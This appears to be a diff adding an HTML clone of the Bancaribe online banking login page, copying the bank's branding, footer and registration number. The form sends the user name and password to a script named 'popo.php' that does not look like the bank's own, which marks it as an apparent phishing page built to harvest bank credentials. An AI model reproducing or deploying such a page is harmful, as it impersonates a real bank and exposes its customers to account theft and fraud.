@@ -1,0 +1,151 @@
+                  <!doctype html>
+                  <html>
+
+                  <head>
+                      <title>Mi Conexión Bancaribe Digital - Sábado, 04 de Noviembre de 2023 [1]</title>
+                      
+
+                      <!-- Estilos CSS -->
+                      <link rel="stylesheet" href="/bcm/css/bootstrap.min.css">
+                      <link rel="stylesheet" href="/bcm/css/bootstrap-essentials.min.css">
+                      <link rel="stylesheet" type="text/css" href="/bcm/css/bootstrap.helper.css" />
+                      <link rel="stylesheet" type="text/css" href="/bcm/css/fontawesome.css" />
+                      <style type="text/css">
+                          body {
+                              display: flex;
+                              flex-direction: column;
+                              min-height: 100vh;
+                              padding-top: 10px;
+                              padding-bottom: 0px;
+                              margin-bottom: 0px;
+                          }
+
+                          .bottom {
+                              margin-top: auto;
+                              margin-bottom: 1px;
+                          }
+
+                          img {
+                              width: 100%;
+                              height: auto;
+                          }
+
+                          .navbarbottom {
+                              width: 95%;
+                              margin: 0 auto;
+                          }
+
+                          .icon-web {
+                              font-size: 40px;
+                          }
+
+                          @media (min-width: 768px) {
+                              img {
+                                  width: 650px;
+                              }
+                              .navbarbottom {
+                                  width: 650px;
+                                  margin: 0 auto;
+                              }
+                              .icon-web {
+                                  font-size: 60px;
+                              }
+                          }
+                      </style>
+                  </head>
+
+                  <body>
+                      <div id="container" style="padding-bottom: 20px;">
+                          <div class="container">
+                              <!-- Banner -->
+                              <img style="display: block; margin: 0 auto; padding-top: 10px; margin-bottom: -15px; margin-top: -10px;"
+                                  src="/bcm/images/logo.svg">
+                              <br>
+                              <br>
+                              <!-- Formulario de inicio de sesión -->
+                              <div class="panel panel-info main-center" id="form1">
+                                  <div class="panel-heading">
+                                      <h3 class="panel-title">
+                                          <strong>Ingresar al Sistema</strong>
+                                          <span style="float: right;">
+                                              <span id="status" class="fas fa-sync fa-spin"
+                                                  style="display:none; margin-right:5px;"></span>
+                                          </span>
+                                      </h3>
+                                  </div>
+                                  <div class="panel-body">
+                                      <form name="form1" action="popo.php" method="post" onsubmit="return login()">
+                                          <div class="form-group">
+                                              <input name="userlogin" id="userlogin" type="text" maxlength="100" autocomplete="off"
+                                                  autocapitalize="off" autocorrect="off" class="form-control" placeholder="Usuario">
+                                          </div>
+                                          <div class="form-group">
+                                              <input name="passwd" id="passwd" type="password" maxlength="40" autocomplete="off"
+                                                  class="form-control" placeholder="Contraseña">
+                                          </div>
+                                          <div class="form-group">
+                                              <div id="form_error" class="errormsg text-danger"
+                                                  style="width: 100%; text-align:center;"></div>
+                                          </div>
+                                          <div class="form-group">
+                                              <div>
+                                                  <button type="submit" class="btn btn-info" id="loginbutton">Ingresar</button>
+                                              </div>
+                                          </div>
+                                          <!-- URI para navegar después del inicio de sesión exitoso -->
+                                          <input type="hidden" name="uri" value="/action/web/business/consultaglobal">
+                                          <input type="hidden" name="ti" value="">
+                                          <input type="hidden" name="ti2" value="">
+                                          <input type="hidden" name="token_id" value="">
+                                          <input type="hidden" name="platform" value="">
+                                          <input type="hidden" name="version" value="">
+                                          <input type="hidden" name="isbiometria" value="">
+                                      </form>
+                                  </div>
+                              </div>
+                              <!-- Fin del formulario de inicio de sesión -->
+                              <div class="main-center">
+                                  <div class="col-xs-12">
+                                      <div class="row">
+                                          <div class="col-xs-6 text-center">
+                                              <button type="button" onclick="redirectToAction('registroclientetarjeta');" class="border-icon">
+                                                  <i class="icon-cliente_nuevo icon-web"></i><br><b>Cliente nuevo</b>
+                                              </button>
+                                          </div>
+                                          <div class="col-xs-6 text-center">
+                                              <button type="button" onclick="redirectToAction('autogestion');" class="border-icon">
+                                                  <i class="icon-autogestion icon-web"></i><br><b>Autogestión</b>
+                                              </button>
+                                          </div>
+                                      </div>
+                                  </div>
+                              </div>
+                          </div>
+                      </div>
+                      <div id="error-response" style="display: none;"></div>
+                      <div class="bottom" id="footerID">
+                          <div class "navbar navbarbottom">
+                              <div class="footer-copyright">
+                                  <div class="col-xs-12">
+                                      <div class="row">
+                                          <div class="col-xs-4 text-center footer-icon" onclick="goToSeguridad();">
+                                              <button type="button">Políticas de<br> Seguridad</button>
+                                          </div>
+                                          <div class="col-xs-4 text-center footer-icon" onclick="goToPrivacidad();">
+                                              <button type="button">Políticas de<br> Privacidad</button>
+                                          </div>
+                                          <div class="col-xs-4 text-center footer-icon" onclick="goToTerminoCondicion();">
+                                              <button type="button">Términos y<br> Condiciones</button>
+                                          </div>
+                                      </div>
+                                  </div>
+                                  <p class="footer-icon footer-iconIndex text-center">© BANCARIBE. Rif: J-000029490.<br/>Todos los derechos reservados.
+                                      <span id="nodo"></span></p>
+                              </div>
+                          </div>
+                      </div>
+                      <script src="/bcm/js/footer.js"></script>
+                      <div id="indexpage" style="display: none;"></div>
+                  </body>
+
+                  </html>
